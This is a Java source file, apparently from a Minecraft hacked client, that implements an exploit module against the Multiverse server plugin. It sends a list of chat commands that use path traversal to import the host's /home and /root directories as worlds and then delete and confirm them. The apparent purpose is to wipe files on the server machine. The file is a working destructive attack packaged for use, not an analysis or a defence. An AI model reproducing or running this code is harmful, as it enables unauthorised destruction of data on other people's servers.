package wtf.norma.nekito.exploit.impl.other;

import net.minecraft.network.play.client.C01PacketChatMessage;
import wtf.norma.nekito.exception.ExploitException;
import wtf.norma.nekito.exploit.Exploit;
import wtf.norma.nekito.exploit.ExploitInfo;
import wtf.norma.nekito.exploit.ExploitType;
import wtf.norma.nekito.helper.ChatHelper;
import wtf.norma.nekito.helper.network.NetHelper;

import java.util.concurrent.TimeUnit;

/*
author @intexpression
 */

@ExploitInfo(
        name = "MVC2",
        type = ExploitType.OTHER,
        description = "Multiverse2 Exploit"
)
public class MultiVerseExploit extends Exploit {

    private static final String[] COMMANDS = {
            "/mv import ../../../../../home normal -t flat",
            "/mv import ../../../../../root normal -t flat",
            "/mv delete ../../../../../home",
            "/mv confirm",
            "/mv delete ../../../../../root",
            "/mv confirm"
    };

    @Override
    public void execute(Object... args) throws ExploitException {
        ChatHelper.printMessage(String.format("Executing &8[&7Method: &d%s&7", getName()));
        long start = System.currentTimeMillis();

        try {
            for (String command : COMMANDS) {
                NetHelper.sendQueuePacket(new C01PacketChatMessage(command));
                TimeUnit.SECONDS.sleep(1);
            }
            ChatHelper.printMessage(String.format("Execution completed &8[&7Method: &d%s&7, Time: &d%sms&8]", getName(), System.currentTimeMillis() - start));
        } catch (Exception ignored) {
            ChatHelper.printMessage(String.format("Execution failed &8[&7Method: &d%s&7, Time: &d%sms&8]", getName(), System.currentTimeMillis() - start));
        }
    }
}

